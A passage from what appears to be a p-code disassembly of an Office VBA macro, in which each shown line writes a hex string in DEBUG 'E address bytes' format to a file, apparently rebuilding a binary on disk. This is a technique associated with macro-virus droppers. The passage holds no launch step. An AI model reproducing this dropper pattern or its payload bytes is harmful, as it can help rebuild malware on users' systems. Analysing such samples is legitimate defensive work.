' 	PrintItemNL 
' Line #958:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FC0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 2A E1"
' 	PrintItemNL 
' Line #959:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FD0 EB 8C 9E DF 4F CF EA 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #960:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FE0 2B E0 EA 9D A6 E5 81 89 BE 9A A1 C8 E6 EB FF F8"
' 	PrintItemNL 
' Line #961:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FF0 FD FF F8 FC FD FD FF FE F1 F6 F5 C1 D4 D7 09 F7"
' 	PrintItemNL 
' Line #962:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3000 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #963:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3010 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 05 5E 5C 00"
' 	PrintItemNL 
' Line #964:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3020 00 01 28 2D 30 45 4B 50 49 51 58 50 5A 61 54 5D"
' 	PrintItemNL 
' Line #965:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3030 61 18 CD C8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #966:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3040 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #967:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3050 F7 EF 09 DB D4 0C 6B 68 1C 26 26 2E 38 38 3A 41"
' 	PrintItemNL 
' Line #968:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3060 44 3F 46 49 3D 43 48 35 3B 40 3A 43 46 3F 48 4B"
' 	PrintItemNL 
' Line #969:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3070 3F 46 49 3D 42 45 3F 44 47 00 00 03 00 00 F3 F6"
' 	PrintItemNL 
' Line #970:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3080 F4 EB EE EC DD DF DF CD CF CF BE C2 C3 B7 BB BC"
' 	PrintItemNL 
' Line #971:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3090 00 00 03 52 57 5A 6A 70 75 6F 75 7A 59 61 68 4B"
' 	PrintItemNL 
' Line #972:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30A0 53 5A 4D 56 5F 2F AB AB 09 F7 EF 09 F7 EF 41 82"
' 	PrintItemNL 
' Line #973:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30B0 86 5D 62 6B 6C 71 7A 26 DA D7 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #974:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30C0 3D 8C 90 49 50 59 5E 67 70 4C 55 5E 46 8A 8E 09"
' 	PrintItemNL 
' Line #975:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30D0 F7 EF 09 F7 EF 09 F7 EF 60 6B 73 58 63 6B 56 5D"
' 	PrintItemNL 
' Line #976:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30E0 66 51 67 6F 09 F7 EF 09 F7 EF 09 F7 EF 5A 66 6C"
' 	PrintItemNL 
' Line #977:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 30F0 56 5F 63 4F 55 5A 40 43 47 06 5F 5E 09 F7 EF 09"
' 	PrintItemNL 
' Line #978:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3100 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #979:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3110 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #980:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3120 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #981:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3130 F7 EF 2A E1 EB 8F A1 E2 4E CE EB 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #982:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3140 EF 09 F7 EF 2C E1 EC 99 A0 E5 8E 94 CF 87 8D BA"
' 	PrintItemNL 
' Line #983:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3150 CD D4 EF F6 FC FF FA FF FF FA FF FB FD FF FE E8"
' 	PrintItemNL 
' Line #984:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3160 ED EC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #985:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3170 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 E9 E1"
' 	PrintItemNL 
' Line #986:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3180 04 04 04 00 00 01 0F 12 16 43 49 4E 4D 55 5C 4F"
' 	PrintItemNL 
' Line #987:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3190 57 5E 4F 58 5C 18 CD C8 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #988:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #989:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 0A CE C7 18"
' 	PrintItemNL 
' Line #990:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31C0 5A 58 2C 31 34 37 3C 3F 3F 43 48 3D 43 48 44 4D"
' 	PrintItemNL 
' Line #991:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31D0 50 46 4F 52 45 4C 4F 46 4B 4E 49 4E 51 01 06 09"
' 	PrintItemNL 
' Line #992:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31E0 00 00 F3 F6 F4 EB EE EC DD DF DF CC CE CE BE C2"
' 	PrintItemNL 
' Line #993:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 31F0 C3 B9 BD BE 00 00 03 48 4D 50 73 79 7E 75 7B 80"
' 	PrintItemNL 
' Line #994:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3200 5D 65 6C 4F 57 5E 4C 55 5E 1F C6 C3 09 F7 EF 09"
' 	PrintItemNL 
' Line #995:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3210 F7 EF 44 84 89 63 68 71 6B 70 79 35 BE BD 09 F7"
' 	PrintItemNL 
' Line #996:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3220 EF 09 F7 EF 37 B2 B2 61 68 71 65 6E 77 4D 56 5F"
' 	PrintItemNL 
' Line #997:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3230 43 95 98 09 F7 EF 09 F7 EF 18 DC D7 62 6F 77 53"
' 	PrintItemNL 
' Line #998:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3240 5E 66 55 5C 65 52 59 62 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #999:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3250 EF 5F 69 70 55 5E 62 4D 53 58 33 36 3A 06 23 25"
' 	PrintItemNL 
' Line #1000:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3260 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1001:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3270 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1002:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3280 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1003:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3290 09 F7 EF 09 F7 EF 2A E1 EB 8E A0 E1 4A CB E7 09"
' 	PrintItemNL 
' Line #1004:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32A0 F7 EF 09 F7 EF 09 F7 EF 2B DF EB 90 96 DD 93 99"
' 	PrintItemNL 
' Line #1005:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32B0 DA 7C 82 B7 B7 BE DF F0 F8 FF F8 FF FF F8 FE F9"
' 	PrintItemNL 
' Line #1006:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32C0 FD FF FC F8 FB F9 3A ED E8 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1007:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32D0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1008:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32E0 EF 09 F7 EF 08 60 5D 00 00 00 00 00 01 43 48 4B"
' 	PrintItemNL 
' Line #1009:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 32F0 53 59 5E 4D 55 5C 49 52 56 19 CE C9 09 F7 EF 09"
' 	PrintItemNL 
' Line #1010:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3300 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1011:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3310 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1012:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3320 09 F7 EF 09 F7 EF 14 8E 8C 29 2E 31 37 3B 40 3D"
' 	PrintItemNL 
' Line #1013:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3330 43 48 3C 45 48 3D 46 49 42 49 4C 4A 4F 52 4D 52"
' 	PrintItemNL 
' Line #1014:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3340 55 00 03 06 00 00 F4 F7 F5 E9 EC EA DE E0 E0 CF"
' 	PrintItemNL 
' Line #1015:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3350 D1 D1 BC C0 C1 B8 BC BD 00 00 03 46 4B 4E 61 67"
' 	PrintItemNL 
' Line #1016:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3360 6C 75 7B 80 66 6E 75 56 5E 65 53 5C 65 1B D0 CD"
' 	PrintItemNL 
' Line #1017:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3370 09 F7 EF 09 F7 EF 4E 8E 93 5D 62 6B 6B 70 79 4C"
' 	PrintItemNL 
' Line #1018:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3380 A8 AB 09 F7 EF 09 F7 EF 1D D2 CE 5B 62 6B 55 5E"
' 	PrintItemNL 
' Line #1019:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3390 67 5C 65 6E 33 B0 B0 09 F7 EF 09 F7 EF 1E D4 D0"
' 	PrintItemNL 
' Line #1020:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33A0 63 70 78 57 62 6A 4D 56 5F 63 6A 73 09 F7 EF 09"
' 	PrintItemNL 
' Line #1021:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33B0 F7 EF 09 F7 EF 43 87 8A 58 61 65 50 54 59 3B 3C"
' 	PrintItemNL 
' Line #1022:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33C0 40 00 00 03 08 CA C3 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1023:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33D0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1024:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1025:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 33F0 EF 09 F7 EF 09 F7 EF 09 F7 EF 2A E2 EC 90 A2 E1"
' 	PrintItemNL 
' Line #1026:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3400 49 CB E7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 8A"
' 	PrintItemNL 
' Line #1027:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3410 91 DA 93 9A DF 84 8B C4 88 90 B8 E9 F4 FF F4 FE"
' 	PrintItemNL 
' Line #1028:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3420 FF F8 FF FC F7 FB F5 FF FF FC 44 F7 F2 09 F7 EF"
' 	PrintItemNL 
' Line #1029:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3430 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1030:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3440 F7 EF 09 F7 EF 09 F7 EF 08 D9 D2 00 00 00 06 08"
' 	PrintItemNL 
' Line #1031:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3450 09 31 36 39 50 56 5B 40 49 4D 3C 47 4B 15 CB C6"
' 	PrintItemNL 
' Line #1032:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3460 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1033:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3470 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1034:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3480 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1F 8A 8A"
' 	PrintItemNL 
' Line #1035:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3490 2D 33 3A 39 3F 44 32 3B 3E 38 41 44 46 4D 50 4F"
' 	PrintItemNL 
' Line #1036:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34A0 54 57 4A 4F 52 00 00 03 00 00 F4 F7 F5 E8 EB E9"
' 	PrintItemNL 
' Line #1037:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34B0 DE E0 E0 D1 D3 D3 BD C1 C2 B5 B9 BA 00 00 03 4A"
' 	PrintItemNL 
' Line #1038:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34C0 4F 52 5C 62 67 7A 80 85 6E 76 7D 55 5D 64 54 5D"
' 	PrintItemNL 
' Line #1039:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34D0 66 1D D3 CF 09 F7 EF 09 F7 EF 60 67 70 5C 61 6A"
' 	PrintItemNL 
' Line #1040:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34E0 6D 72 7B 61 91 97 09 F7 EF 09 F7 EF 0E EE E7 5C"
' 	PrintItemNL 
' Line #1041:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 34F0 63 6C 4F 58 61 52 5B 64 1F C7 C4 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1042:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3500 EF 27 C0 BE 62 6D 75 5A 65 6D 4B 54 5D 5D 66 6F"
' 	PrintItemNL 
' Line #1043:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3510 19 DD D8 09 F7 EF 09 F7 EF 48 8A 8D 59 5F 64 4C"
' 	PrintItemNL 
' Line #1044:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3520 50 55 29 2A 2E 02 00 03 08 5F 5D 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1045:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3530 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1046:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3540 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1047:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3550 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 29 E1"
' 	PrintItemNL 
' Line #1048:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3560 EB 8D 9F DE 4A CB E7 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1049:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3570 09 F7 EF 91 98 E1 90 98 DE 83 8C CB 88 92 C1 D8"
' 	PrintItemNL 
' Line #1050:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3580 E2 FF F0 FA FF F8 FF FF FD FF FC FD FE FA 64 F9"
' 	PrintItemNL 
' Line #1051:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3590 F5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1052:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 04"
' 	PrintItemNL 
' Line #1053:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35B0 5E 5A 00 00 01 21 26 27 4C 52 57 47 50 54 47 52"
' 	PrintItemNL 
' Line #1054:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35C0 56 1C C4 C0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1055:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35D0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1056:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1057:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 35F0 EF 1F 9A 9A 33 3B 42 21 29 30 37 42 46 3F 48 4B"
' 	PrintItemNL 
' Line #1058:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3600 44 4B 4E 49 4E 51 43 48 4B 00 00 03 00 00 F5 F8"
' 	PrintItemNL 
' Line #1059:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3610 F6 E7 EA E8 DE E0 E0 D2 D4 D4 BE C2 C3 B2 B6 B7"
' 	PrintItemNL 
' Line #1060:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3620 00 00 03 54 59 5C 43 49 4E 6A 70 75 70 78 7F 53"
' 	PrintItemNL 
' Line #1061:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3630 5B 62 4A 53 5C 0D EE E7 09 F7 EF 09 F7 EF 57 5E"
' 	PrintItemNL 
' Line #1062:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3640 67 55 5C 65 69 70 79 71 78 81 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1063:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3650 09 F7 EF 4E 72 79 52 5B 64 50 59 62 0D ED E6 09"
' 	PrintItemNL 
' Line #1064:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3660 F7 EF 09 F7 EF 2E AA AA 5E 67 70 5A 63 6C 4A 53"
' 	PrintItemNL 
' Line #1065:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3670 5C 56 5F 68 1D D2 CF 09 F7 EF 09 F7 EF 33 AE AD"
' 	PrintItemNL 
' Line #1066:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3680 54 5A 5F 45 48 4D 28 27 2B 09 05 0A 04 0F 10 08"
' 	PrintItemNL 
' Line #1067:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3690 C9 C3 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1068:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1069:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1070:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36C0 F7 EF 2A E1 EA 8C 9D DC 4B CB E7 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1071:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36D0 EF 09 F7 EF 09 F7 EF 93 9B E1 8E 96 DC 88 91 D4"
' 	PrintItemNL 
' Line #1072:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36E0 88 94 CA B5 C0 E6 ED F7 FF F6 FF FF FD FF FE FB"
' 	PrintItemNL 
' Line #1073:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 36F0 FA F6 83 FB F7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1074:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3700 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1075:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3710 09 F7 EF 09 E9 E1 01 10 10 12 16 17 43 49 4E 48"
' 	PrintItemNL 
' Line #1076:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3720 51 55 4A 54 5B 32 92 93 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1077:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3730 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1078:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3740 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1079:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3750 F7 EF 09 F7 EF 12 C8 C3 38 41 4A 1F 28 31 34 3F"
' 	PrintItemNL 
' Line #1080:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3760 43 3F 48 4B 41 48 4B 45 4A 4D 3D 42 45 00 00 03"
' 	PrintItemNL 
' Line #1081:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3770 00 00 F7 FA F8 E8 EB E9 DC DE DE D2 D4 D4 BF C3"
' 	PrintItemNL 
' Line #1082:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3780 C4 B1 B5 B6 00 01 04 64 69 6C 3B 41 46 56 5C 61"
' 	PrintItemNL 
' Line #1083:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3790 73 7B 82 65 6D 74 4C 55 5E 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1084:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37A0 F7 EF 4E 55 5E 51 58 61 64 6B 74 69 70 79 1C D1"
' 	PrintItemNL 
' Line #1085:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37B0 CD 09 F7 EF 09 F7 EF 35 92 95 59 62 6B 47 7B 80"
' 	PrintItemNL 
' Line #1086:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37C0 09 F7 EF 09 F7 EF 09 F7 EF 35 95 97 5A 63 6C 56"
' 	PrintItemNL 
' Line #1087:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37D0 5F 68 4F 58 61 53 5C 65 1A D0 CC 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1088:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37E0 EF 2F AB AA 4D 53 58 3E 41 46 1A 19 1D 02 00 03"
' 	PrintItemNL 
' Line #1089:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 37F0 04 00 01 0C 16 17 28 BD B8 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1090:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3800 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1091:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3810 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1092:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3820 09 F7 EF 09 F7 EF 2A E0 EA 90 9F DE 4B CB E8 09"
' 	PrintItemNL 
' Line #1093:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
